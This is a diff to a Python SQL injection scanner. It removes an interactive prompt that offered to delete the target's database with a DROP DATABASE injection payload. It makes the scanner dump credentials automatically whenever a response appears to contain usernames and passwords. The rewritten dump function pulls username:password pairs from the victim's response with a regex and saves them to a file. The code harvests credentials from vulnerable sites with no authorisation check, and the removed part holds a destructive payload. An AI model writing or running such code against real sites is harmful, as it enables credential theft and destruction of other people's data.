@@ -97,7 +97,7 @@ def test_sql_injection(url, method, form_data):
                     logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
             elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
                 logger.info(f"[CREDENTIALS DUMP] Found credentials at {url} with payload {payload}")
-                prompt_for_action(response.text, url)
+                dump_credentials(response.text)
                 break  # Stop further scanning after detecting vulnerability
 
             # Print success message if vulnerability is detected
@@ -107,48 +107,20 @@ def test_sql_injection(url, method, form_data):
         except RequestException as e:
             logger.info(f"Error testing {url}: {str(e)}")
 
-# Function to prompt user for action if credentials are found
-def prompt_for_action(credentials_data, url):
-    print(f"Vulnerability found at {url} with potential credential data.")
-    action = input("Choose action: 1) Delete database 2) Dump credentials to file: ")
-    
-    if action == '1':
-        confirm = input("Are you sure you want to DELETE the database? (yes/no): ").lower()
-        if confirm == 'yes':
-            logger.info(f"Attempting to delete database on {url}.")
-            # Here we simulate the query that might delete the database
-            delete_database(url)
-        else:
-            logger.info("Database deletion canceled.")
-        
-    elif action == '2':
-        logger.info("Dumping credentials to file.")
-        dump_credentials(credentials_data)
-        
-    else:
-        logger.info("Invalid choice. No action taken.")
-
-# Function to simulate database deletion (dangerous!)
-def delete_database(url):
-    # This is a dangerous operation and should only be done in a controlled environment.
-    # In real penetration testing, this would involve sending a DELETE request or a 
-    # `DROP DATABASE` SQL command if the vulnerability allows it.
-    try:
-        payload = "'; DROP DATABASE test_db; --"  # A malicious payload to drop the database
-        response = requests.get(url, params={'id': payload}, headers=headers, timeout=5)
-        if response.status_code == 200:
-            logger.info(f"Database deletion attempted at {url}.")
-            logger.info("Warning: This could result in complete data loss.")
-        else:
-            logger.info("Failed to delete database.")
-    except Exception as e:
-        logger.error(f"Error deleting database: {e}")
-
 # Function to save the credentials dump to a file
 def dump_credentials(data):
-    with open('dumped_credentials.txt', 'a') as f:
-        f.write(data + "\n")
-    logger.info("Credentials dumped to 'dumped_credentials.txt'")
+    # Look for the usernames and passwords in the response content.
+    # This is a simplified approach, assuming the credentials are easily extractable.
+    # Adjust this logic based on actual structure of the credentials data.
+    import re
+    credentials = re.findall(r'(\w+)\s*:\s*(\S+)', data)  # Match username:password pairs
+    if credentials:
+        with open('dumped_credentials.txt', 'a') as f:
+            for username, password in credentials:
+                f.write(f"Username: {username} | Password: {password}\n")
+        logger.info("Credentials dumped to 'dumped_credentials.txt'.")
+    else:
+        logger.info("No credentials found in response.")
 
 # Function to scan forms on a page
 def scan_forms(url):
